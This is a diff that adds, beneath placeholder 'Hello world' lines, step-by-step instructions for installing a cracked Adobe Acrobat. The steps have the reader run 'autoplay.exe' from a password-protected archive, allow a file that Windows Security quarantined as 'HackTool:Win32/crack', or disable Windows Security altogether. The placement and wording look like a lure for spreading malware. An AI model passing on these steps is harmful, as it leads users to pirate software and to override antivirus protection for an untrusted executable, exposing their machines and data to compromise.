@@ -3,3 +3,15 @@ Hello world1
 Hello world2
 Hello world3
 Hello world4
+If you facing problem for installing Adobe crack then Steps are-- 
+1- Just Extract the file with any file extracting software (Password -123) 
+2- Turn off WIFI. 
+3-Click on "autoplay.exe" file 
+4- You might get a notification from windows securtiy saing **Current thread-""HackTool:Win32/crack"" was Quarantine** 
+5- Allow the "HackTool:Win32/crack" tool to run by Clicking on "ALLOW THIS THREAD" in windows security OR You can disable the ENTIRE WINDOWS SECURITY while Installing. (Personally I Don't recommend the Second method, if your PC has Really important work files) 
+6-Run the Autoplay.exe and let it do it's work 
+7-Search for acrobat in start 
+----And That's it---- 
+After that you can enable you wifi or Block the "HackTool:Win32/crack" from the windows security that's totally up to you and 
+start using windows Security/Protection Feature I personally use this trick in both of my laptop that run on WIndows 10 and 11. 
+Thank you dev. for crack version...
